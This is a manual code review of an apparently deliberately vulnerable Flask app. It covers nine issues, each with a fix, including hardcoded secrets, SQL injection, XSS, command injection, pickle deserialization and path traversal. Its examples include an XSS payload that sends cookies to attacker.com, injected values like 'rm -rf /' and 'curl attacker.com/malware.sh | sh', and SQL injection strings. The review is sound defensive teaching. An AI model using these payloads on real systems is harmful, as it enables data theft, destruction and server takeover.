# Manual Code Review — vulnerable_app.py

**Reviewer:** Anjali Kumari
**File reviewed:** `vulnerable_app.py`
**Method:** Manual line-by-line inspection, supplementing the automated Bandit scan (see `bandit_report.txt`)

## Purpose of this review

This document walks through each security issue found in `vulnerable_app.py`, explaining what the problem is, why it matters, and how an attacker could exploit it. The goal is to demonstrate the kind of reasoning a manual code review adds on top of automated tools — automated scanners are good at pattern-matching known-bad code shapes, but a human reviewer can explain *impact* and catch issues tools sometimes miss, like missing authentication checks.

---

## 1. Hardcoded Secrets (lines 24–25)

```python
ADMIN_PASSWORD = "SuperSecret123"
API_KEY = "sk_live_51H8xJ2eZvKYlo2C0FAKEKEYFORDEMO"
```

**Why it's a problem:** Anyone with read access to the source code — including anyone who finds it on GitHub, a former employee, or someone who gains partial access to the server — now has full credentials. If this code is ever pushed to a public repository, these secrets are permanently exposed in the git history, even if removed later.

**Fix:** Load secrets from environment variables or a secrets manager (e.g., `os.environ["ADMIN_PASSWORD"]`), and add config files containing real secrets to `.gitignore`.

## 2. Weak Password Hashing (lines 42, 63)

```python
hashed = hashlib.md5(password.encode()).hexdigest()
```

**Why it's a problem:** MD5 was designed for checksums, not passwords — it's fast, which is exactly what makes it *bad* for this purpose. Modern hardware can compute billions of MD5 hashes per second, making brute-force and rainbow-table attacks trivial if a password database is ever leaked.

**Fix:** Use a purpose-built password hashing algorithm like `bcrypt`, `scrypt`, or `argon2`, which are deliberately slow and include salting to prevent rainbow-table attacks.

## 3. SQL Injection (lines 47, 68)

```python
conn.execute(f"INSERT INTO users (username, password) VALUES ('{username}', '{hashed}')")
query = f"SELECT * FROM users WHERE username='{username}' AND password='{hashed}'"
```

**Why it's a problem:** User input is inserted directly into SQL query strings. An attacker submitting a username like `' OR '1'='1` could bypass the login check entirely, or a value like `'; DROP TABLE users; --` could destroy the entire user table. This is one of the most well-known and dangerous vulnerability classes in web applications (OWASP Top 10, #3: Injection).

**Fix:** Use parameterized queries, which keep user input separated from the SQL command structure:
```python
conn.execute("INSERT INTO users (username, password) VALUES (?, ?)", (username, hashed))
```

## 4. Cross-Site Scripting / XSS (lines 78–80)

```python
template = f"<h1>Welcome, {name}!</h1>"
return render_template_string(template)
```

**Why it's a problem:** User-supplied input is inserted directly into HTML without escaping. A visitor could submit `name=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>`, and that script would execute in any other user's browser who views the page — potentially stealing session cookies or performing actions on their behalf.

**Fix:** Use Flask's `render_template` with Jinja2 templates (which auto-escape variables by default) instead of building HTML strings manually, or explicitly escape user input with `markupsafe.escape()`.

## 5. Command Injection (lines 85–88)

```python
result = os.popen(f"ping -c 1 {host}").read()
```

**Why it's a problem:** User input is concatenated directly into a shell command. A value like `127.0.0.1; rm -rf /` or `127.0.0.1 && curl attacker.com/malware.sh | sh` would run as a second command on the server, giving an attacker arbitrary code execution.

**Fix:** Avoid shell commands with user input entirely where possible. If unavoidable, use `subprocess.run()` with a list of arguments (not a shell string) and validate the input format strictly (e.g., confirm it's a valid IP address) before use.

## 6. Insecure Deserialization (lines 94–97)

```python
data = request.data
session_obj = pickle.loads(data)
```

**Why it's a problem:** Python's `pickle` module can execute arbitrary code during deserialization. An attacker who can send data to this endpoint can craft a malicious pickle payload that runs any code they want on the server the moment it's loaded — this is a direct path to full server compromise.

**Fix:** Never unpickle data from an untrusted source. Use a safe, data-only format like JSON instead, which cannot execute code during parsing.

## 7. Path Traversal (lines 102–106)

```python
filename = request.args.get("file", "")
with open(filename, "r") as f:
    return f.read()
```

**Why it's a problem:** There's no validation on the filename. A request like `/download?file=../../../../etc/passwd` (or the Windows equivalent) could read any file the server process has access to, potentially exposing configuration files, source code, or credentials.

**Fix:** Restrict the file to a known safe directory, resolve the path, and verify it's still inside that directory before opening it (e.g., using `os.path.realpath` and comparing against an allowed base directory), or maintain an allow-list of valid filenames.

## 8. Broken Access Control (lines 110–115)

```python
@app.route("/admin/backup", methods=["POST"])
def backup():
    subprocess.run(["cp", DB_PATH, "backup_users.db"])
    return "Backup complete"
```

**Why it's a problem:** This is a sensitive administrative action with no check confirming the caller is actually an authenticated admin. Anyone who discovers this endpoint URL can trigger it.

**Fix:** Require authentication (e.g., a valid session token) and authorization (confirm the user has an admin role) before executing any sensitive action, not just for this endpoint but as a general pattern across the app.

## 9. Debug Mode Enabled in Production (line 120)

```python
app.run(debug=True, host="0.0.0.0")
```

**Why it's a problem:** Flask's debug mode exposes the Werkzeug interactive debugger to anyone who triggers an unhandled exception — and that debugger allows arbitrary Python code execution directly from the browser. Combined with `host="0.0.0.0"` (which binds to all network interfaces, not just localhost), this exposes the debugger to the entire network, not just the local machine.

**Fix:** Never enable `debug=True` outside of local development, and never combine it with binding to `0.0.0.0`. Use a proper production WSGI server (e.g., Gunicorn) instead of Flask's built-in dev server for deployment.

---

## Summary

| # | Vulnerability | Severity | OWASP Category |
|---|---|---|---|
| 1 | Hardcoded Secrets | High | A05: Security Misconfiguration |
| 2 | Weak Password Hashing | High | A02: Cryptographic Failures |
| 3 | SQL Injection | Critical | A03: Injection |
| 4 | Cross-Site Scripting | High | A03: Injection |
| 5 | Command Injection | Critical | A03: Injection |
| 6 | Insecure Deserialization | Critical | A08: Software and Data Integrity Failures |
| 7 | Path Traversal | High | A01: Broken Access Control |
| 8 | Broken Access Control | High | A01: Broken Access Control |
| 9 | Debug Mode Enabled | Medium | A05: Security Misconfiguration |

## General recommendations

- **Never trust user input.** Every value coming from a request (form data, query parameters, headers, uploaded files) should be validated and treated as potentially malicious.
- **Use parameterized queries and templating engines** rather than building SQL or HTML through string concatenation.
- **Keep secrets out of source code.** Use environment variables or a dedicated secrets manager.
- **Apply the principle of least privilege** — every endpoint should check that the caller is both authenticated and authorized for that specific action.
- **Never run debug/development settings in a production environment.**

A fully remediated version of this application addressing every issue above is provided in `secure_version.py`. 